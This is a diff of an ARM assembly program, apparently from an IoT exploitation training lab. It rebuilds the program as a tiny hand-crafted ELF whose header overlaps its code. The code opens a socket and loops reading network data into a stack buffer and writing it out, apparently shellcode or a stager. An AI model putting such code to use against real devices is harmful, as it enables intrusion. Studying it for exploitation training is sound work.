@@ -20,17 +20,35 @@
  * code.
  *
  * by Saumil Shah
- *    ARM IoT Exploit Laboratory
+ *
+ * Header inspired by Minimal ARM ELF binary
+ * https://github.com/mydzor/tinyelf-arm
  */
 
-.section .text
-.global _start
-_start:
-    .code 32
+.macro bump addr
+.word \addr+0x200000
+.endm
 
+ehdr:                    /* Elf32_Ehdr                      */
+    .byte   0x7F         /* e_ident                         */
+    .ascii  "ELF"
+    .word   1            /*                    |p_type      */
+    .word   0            /*                    |p_offset    */
+    .word   0x200000     /*                    |p_vaddr     */
+    .word   0x280002     /* e_type & e_machine |p_paddr     */
+    bump    main         /* e_version          |p_filesz    */
+    bump    main         /* e_entry            |p_memsz     */
+    .word   4            /* e_phoff            |p_flags     */
+
+main:
+    .code 32
     // socket(2, 1, 0)
-    mov     r0, #2
-    mov     r1, #1
+    mov     r0, #2       /* e_shoff            |p_allign    */
+    mov     r1, #1       /* e_flags                         */
+    .word   0x00200034   /* e_ehsize & e_phentsize          */
+                         /* eoreq r0, r0, r4, lsr r0        */
+    .word   0x00000001   /* e_phnum & e_shentsize           */
+                         /* andeq r0, r0, r1                */
     eor     r2, r2, r2         // set r2 to null
     mov     r7, #200           // r7 = 281 (socket)
     add     r7, #81
@@ -44,7 +62,8 @@ _start:
     svc     #0
 
     // set aside 1024 bytes of stack space for buffer
-    mov     r3, #1024
+    mov     r3, #1
+    lsl     r3, #10            // r3 = 1024
     mov     r1, sp             // r1 = buf
     sub     r1, r1, r3
     mov     sp, r1
@@ -56,7 +75,7 @@ READ_WRITE_LOOP:
     mov     r2, r3             // count (1024)
     mov     r7, #3             // r7 = read
     svc     #0
-
+    
     // write(sockfd, buf, count)
     mov     r2, r0             // number of bytes read
     mov     r0, r4             // r0 = socket
